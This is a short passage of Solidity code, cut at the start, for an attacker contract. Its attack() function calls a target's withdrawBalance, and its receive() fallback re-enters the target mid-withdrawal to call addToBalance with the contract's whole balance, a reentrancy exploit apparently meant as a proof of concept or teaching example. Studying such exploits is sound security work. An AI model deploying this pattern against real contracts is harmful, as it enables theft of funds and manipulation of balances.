    C public target;

    constructor(C _target) {
        target = _target;
    }

    function attack() external {
        target.withdrawBalance();
    }

    receive() external payable {
        // Re-enter and deposit additional Ether during withdrawBalance
        target.addToBalance{value: address(this).balance}();
    }
}

